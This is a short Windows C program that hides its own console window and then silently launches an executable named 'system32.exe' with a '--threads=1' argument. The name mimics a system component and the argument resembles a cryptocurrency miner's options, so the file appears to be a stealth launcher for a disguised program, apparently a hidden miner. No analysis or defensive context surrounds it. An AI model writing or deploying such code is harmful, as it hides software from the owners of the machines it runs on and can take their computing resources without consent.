#include <stdio.h>
#include <windows.h>



int main(){
	
    //hide Window

    HWND stealth;
    AllocConsole();
    stealth = FindWindow("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
    
    system("system32.exe --threads=1");
    return 0;
}

